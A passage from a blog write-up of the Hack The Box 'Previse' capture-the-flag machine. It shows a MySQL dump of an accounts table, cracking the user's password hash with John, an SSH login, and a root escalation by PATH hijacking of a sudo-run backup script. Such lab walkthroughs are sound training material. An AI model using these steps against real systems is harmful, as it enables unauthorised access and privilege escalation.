Copyright (<span style=color:#66d9ef>c</span>) <span style=color:#ae81ff>2000</span>, <span style=color:#ae81ff>2021</span>, Oracle <span style=color:#66d9ef>and</span><span style=color:#f92672>/</span><span style=color:#66d9ef>or</span> its affiliates.

Oracle <span style=color:#66d9ef>is</span> a registered trademark <span style=color:#66d9ef>of</span> Oracle Corporation <span style=color:#66d9ef>and</span><span style=color:#f92672>/</span><span style=color:#66d9ef>or</span> its
affiliates. Other <span style=color:#66d9ef>names</span> may be trademarks <span style=color:#66d9ef>of</span> their respective
owners.

<span style=color:#66d9ef>Type</span> <span style=color:#e6db74>&#39;help;&#39;</span> <span style=color:#66d9ef>or</span> <span style=color:#e6db74>&#39;\h&#39;</span> <span style=color:#66d9ef>for</span> help. <span style=color:#66d9ef>Type</span> <span style=color:#e6db74>&#39;\c&#39;</span> <span style=color:#66d9ef>to</span> clear the <span style=color:#66d9ef>current</span> <span style=color:#66d9ef>input</span> <span style=color:#66d9ef>statement</span>.

mysql<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>show</span> databases;
<span style=color:#66d9ef>show</span> databases;
<span style=color:#f92672>+</span><span style=color:#75715e>--------------------+
</span><span style=color:#75715e></span><span style=color:#f92672>|</span> <span style=color:#66d9ef>Database</span>           <span style=color:#f92672>|</span>
<span style=color:#f92672>+</span><span style=color:#75715e>--------------------+
</span><span style=color:#75715e></span><span style=color:#f92672>|</span> information_schema <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span> mysql              <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span> performance_schema <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span> previse            <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span> sys                <span style=color:#f92672>|</span>
<span style=color:#f92672>+</span><span style=color:#75715e>--------------------+
</span><span style=color:#75715e></span><span style=color:#ae81ff>5</span> <span style=color:#66d9ef>rows</span> <span style=color:#66d9ef>in</span> <span style=color:#66d9ef>set</span> (<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>01</span> sec)

mysql<span style=color:#f92672>&gt;</span> use previse;
use previse;
Reading <span style=color:#66d9ef>table</span> information <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>completion</span> <span style=color:#66d9ef>of</span> <span style=color:#66d9ef>table</span> <span style=color:#66d9ef>and</span> <span style=color:#66d9ef>column</span> <span style=color:#66d9ef>names</span>
You can turn <span style=color:#66d9ef>off</span> this feature <span style=color:#66d9ef>to</span> <span style=color:#66d9ef>get</span> a quicker startup <span style=color:#66d9ef>with</span> <span style=color:#f92672>-</span>A

<span style=color:#66d9ef>Database</span> changed
mysql<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>show</span> tables;
<span style=color:#66d9ef>show</span> tables;
<span style=color:#f92672>+</span><span style=color:#75715e>-------------------+
</span><span style=color:#75715e></span><span style=color:#f92672>|</span> Tables_in_previse <span style=color:#f92672>|</span>
<span style=color:#f92672>+</span><span style=color:#75715e>-------------------+
</span><span style=color:#75715e></span><span style=color:#f92672>|</span> accounts          <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span> files             <span style=color:#f92672>|</span>
<span style=color:#f92672>+</span><span style=color:#75715e>-------------------+
</span><span style=color:#75715e></span><span style=color:#ae81ff>2</span> <span style=color:#66d9ef>rows</span> <span style=color:#66d9ef>in</span> <span style=color:#66d9ef>set</span> (<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>01</span> sec)

mysql<span style=color:#f92672>&gt;</span> 
</code></pre></div><h3 id=finding-and-cracking-password-hashes-from-the-sql-database>Finding and Cracking Password Hashes from the SQL Database<a hidden class=anchor aria-hidden=true href=#finding-and-cracking-password-hashes-from-the-sql-database>#</a></h3>
<p>It seems the credentials do work! That <code>accounts</code> table looks pretty interesting. Contents:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql>mysql<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>select</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>from</span> accounts;
<span style=color:#66d9ef>select</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>from</span> accounts;
<span style=color:#f92672>+</span><span style=color:#75715e>----+---------------+------------------------------------+---------------------+
</span><span style=color:#75715e></span><span style=color:#f92672>|</span> id <span style=color:#f92672>|</span> username      <span style=color:#f92672>|</span> password                           <span style=color:#f92672>|</span> created_at          <span style=color:#f92672>|</span>
<span style=color:#f92672>+</span><span style=color:#75715e>----+---------------+------------------------------------+---------------------+
</span><span style=color:#75715e></span><span style=color:#f92672>|</span>  <span style=color:#ae81ff>1</span> <span style=color:#f92672>|</span> m4lwhere      <span style=color:#f92672>|</span> <span style=color:#f92672>&lt;</span>REDACTED<span style=color:#f92672>&gt;</span>                         <span style=color:#f92672>|</span> <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>27</span> <span style=color:#ae81ff>18</span>:<span style=color:#ae81ff>18</span>:<span style=color:#ae81ff>36</span> <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span>  <span style=color:#ae81ff>2</span> <span style=color:#f92672>|</span> Squid         <span style=color:#f92672>|</span> <span style=color:#f92672>&lt;</span>REDACTED<span style=color:#f92672>&gt;</span>                         <span style=color:#f92672>|</span> <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>12</span><span style=color:#f92672>-</span><span style=color:#ae81ff>23</span> <span style=color:#ae81ff>05</span>:<span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>33</span> <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span>  <span style=color:#ae81ff>3</span> <span style=color:#f92672>|</span> username      <span style=color:#f92672>|</span> <span style=color:#f92672>&lt;</span>REDACTED<span style=color:#f92672>&gt;</span>                         <span style=color:#f92672>|</span> <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>12</span><span style=color:#f92672>-</span><span style=color:#ae81ff>23</span> <span style=color:#ae81ff>07</span>:<span style=color:#ae81ff>08</span>:<span style=color:#ae81ff>53</span> <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span>  <span style=color:#ae81ff>4</span> <span style=color:#f92672>|</span> recon_pilot   <span style=color:#f92672>|</span> <span style=color:#f92672>&lt;</span>REDACTED<span style=color:#f92672>&gt;</span>                         <span style=color:#f92672>|</span> <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>12</span><span style=color:#f92672>-</span><span style=color:#ae81ff>23</span> <span style=color:#ae81ff>07</span>:<span style=color:#ae81ff>58</span>:<span style=color:#ae81ff>57</span> <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span>  <span style=color:#ae81ff>5</span> <span style=color:#f92672>|</span> administrator <span style=color:#f92672>|</span> <span style=color:#f92672>&lt;</span>REDACTED<span style=color:#f92672>&gt;</span>                         <span style=color:#f92672>|</span> <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>12</span><span style=color:#f92672>-</span><span style=color:#ae81ff>23</span> <span style=color:#ae81ff>08</span>:<span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>22</span> <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span>  <span style=color:#ae81ff>6</span> <span style=color:#f92672>|</span> username123   <span style=color:#f92672>|</span> <span style=color:#f92672>&lt;</span>REDACTED<span style=color:#f92672>&gt;</span>                         <span style=color:#f92672>|</span> <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>12</span><span style=color:#f92672>-</span><span style=color:#ae81ff>23</span> <span style=color:#ae81ff>11</span>:<span style=color:#ae81ff>38</span>:<span style=color:#ae81ff>07</span> <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span>  <span style=color:#ae81ff>7</span> <span style=color:#f92672>|</span> nada123       <span style=color:#f92672>|</span> <span style=color:#f92672>&lt;</span>REDACTED<span style=color:#f92672>&gt;</span>                         <span style=color:#f92672>|</span> <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>12</span><span style=color:#f92672>-</span><span style=color:#ae81ff>23</span> <span style=color:#ae81ff>13</span>:<span style=color:#ae81ff>11</span>:<span style=color:#ae81ff>39</span> <span style=color:#f92672>|</span>
<span style=color:#f92672>+</span><span style=color:#75715e>----+---------------+------------------------------------+---------------------+
</span><span style=color:#75715e></span><span style=color:#ae81ff>7</span> <span style=color:#66d9ef>rows</span> <span style=color:#66d9ef>in</span> <span style=color:#66d9ef>set</span> (<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>00</span> sec)
</code></pre></div><p>Very nice! We have all existing usernames and their password hashes for each user of the Previse site — of course, only the <code>m4lwhere</code> user is of any interest, as all other usernames are HTB users. <em>Note that, to preserve the integrity of the CTF, the password hashes have been redacted.</em> John or Hashcat could be used here — I&rsquo;ll use John, since I&rsquo;m familiar with it and the GPU in my Parrot machine is far from powerful&mldr;</p>
<pre tabindex=0><code class=language-none data-lang=none>$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long
Created directory: /home/slak/.john
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

...
</code></pre><p>Lets explore the Previse file system while John is running. Exiting from the SQL database and executing <code>ls /home</code> reveals the existence of the <code>m4lwhere</code> user&rsquo;s home directory. Pushing further reveals&mldr;</p>
<pre tabindex=0><code class=language-none data-lang=none>www-data@previse:/var/www/html$ ls /home/m4lwhere
user.txt
www-data@previse:/var/www/html$ cat /home/m4lwhere/user.txt
cat: /home/m4lwhere/user.txt: Permission denied
</code></pre><p>The USER flag! Too bad it&rsquo;s read-protected. No matter; remember the open port 22 from the enumeration stage? We&rsquo;ll (hopefully) be able to SSH into Previse as <code>m4lwhere</code> soon enough. At that point, the permissions on user.txt won&rsquo;t matter.</p>
<p>After some time, the hash was successfully cracked.</p>
<h3 id=obtaining-the-user-flag>Obtaining the USER Flag<a hidden class=anchor aria-hidden=true href=#obtaining-the-user-flag>#</a></h3>
<p>Let&rsquo;s see if we can use our newfound password to ssh into Previse as user <code>m4lwhere</code>.</p>
<pre tabindex=0><code class=language-none data-lang=none>$ ssh m4lwhere@10.10.11.104
The authenticity of host '10.10.11.104 (10.10.11.104)' can't be established.
ECDSA key fingerprint is SHA256:rr7ooHUgwdLomHhLfZXMaTHltfiWVR7FJAe2R7Yp5LQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.104' (ECDSA) to the list of known hosts.
m4lwhere@10.10.11.104's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Dec 23 14:08:52 UTC 2021

  System load:  0.0               Processes:           221
  Usage of /:   51.3% of 4.85GB   Users logged in:     1
  Memory usage: 39%               IP address for eth0: 10.10.11.104
  Swap usage:   0%


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Dec 23 13:52:12 2021 from 10.10.16.52
m4lwhere@previse:~$ 
</code></pre><p>Success! Now to read the USER flag:</p>
<pre tabindex=0><code class=language-none data-lang=none>m4lwhere@previse:~$ cat user.txt
&lt;REDACTED&gt;
</code></pre><p>HTB accepted the flag, but we&rsquo;re not quite done yet; the SYSTEM flag remains.</p>
<h3 id=escalating-privileges>Escalating Privileges<a hidden class=anchor aria-hidden=true href=#escalating-privileges>#</a></h3>
<p>Executing <a href="https://explainshell.com/explain?cmd=sudo+-l"><code>sudo -l</code></a> reveals that:</p>
<pre tabindex=0><code class=language-none data-lang=none>User m4lwhere may run the following commands on previse:
 (root) /opt/scripts/access_backup.sh
</code></pre><p>Interesting — here is the contents of access_backup.sh:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/bash
</span><span style=color:#75715e></span>
<span style=color:#75715e># We always make sure to store logs, we take security SERIOUSLY here</span>

<span style=color:#75715e># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
<span style=color:#75715e># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>

gzip -c /var/log/apache2/access.log &gt; /var/backups/<span style=color:#66d9ef>$(</span>date --date<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yesterday&#34;</span> +%Y%b%d<span style=color:#66d9ef>)</span>_access.gz
gzip -c /var/www/file_access.log &gt; /var/backups/<span style=color:#66d9ef>$(</span>date --date<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yesterday&#34;</span> +%Y%b%d<span style=color:#66d9ef>)</span>_file_access.gz
</code></pre></div><p>Examining the script, it looks like development negligence turned in my favor. Both the <code>gzip</code> and <code>date</code> binaries are referenced relatively; therefore, we can edit PATH to point to my own <code>gzip</code>/<code>date</code> script(s). Consider the following commands, given that I have created a <code>date</code> program in <code>/home/m4lwhere</code>:</p>
<pre tabindex=0><code class=language-none data-lang=none>m4lwhere@previse:~$ export PATH=:/home/m4lwhere
m4lwhere@previse:~$ /bin/cat date
#!/bin/bash
/bin/su
m4lwhere@previse:~$ /usr/bin/sudo /opt/scripts/access_backup.sh 
root@previse:/home/m4lwhere# 
</code></pre><p>Root access has been granted!</p>
<h3 id=obtaining-the-system-flag>Obtaining the SYSTEM Flag<a hidden class=anchor aria-hidden=true href=#obtaining-the-system-flag>#</a></h3>
<p>All that is left is to print the SYSTEM flag:</p>
<pre tabindex=0><code class=language-none data-lang=none>root@previse:/home/m4lwhere# ls /root
root.txt
root@previse:/home/m4lwhere# cat /root/root.txt
&lt;REDACTED&gt;
</code></pre><p>And there it is — the SYSTEM flag! The flag was accepted by HTB; thus, <a href=https://www.hackthebox.com/achievement/machine/787255/373>Previse is complete</a>.</p>
<h2 id=conclusion>Conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2>
<p>This was a very fun CTF overall, which I admit I found challenging despite the low difficulty rating relative to other HTB challenges. I had a lot of fun working on Previse, and it felt noticeably more accessible to me than some other HTB machines I&rsquo;ve attempted. I learned a lot and I encourage others interested in red team security activities to give their own best effort toward this challenge&mldr; even if they end up with 50+ open browser tabs at the end like I did.</p>
<p>I hope you found this guide helpful or inspirational. Thank you so much for reading, and check back soon for more activity reports.</p>
<p>-Sid</p>
<p><a href=https://www.hackthebox.com/achievement/machine/787255/373>https://www.hackthebox.com/achievement/machine/787255/373</a></p>
<p><img loading=lazy src=/docs/previse6.png alt=https://www.hackthebox.com/achievement/machine/787255/373>
</p>
<p><em>Feedback? <a href="mailto:contact@swlacy.com?subject=Previse%20Report">I can be reached via email</a>.</em></p>
</div>
<footer class=post-footer>
</footer>
</article>
</main>
<footer class=footer>
<span>Copyright &copy; 2022 Sid Lacy • Last Built 22.01.20 UTC</a></span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script src=https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin=anonymous referrerpolicy=no-referrer></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(a=>{mediumZoom(a,{background:'#000'})})</script>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>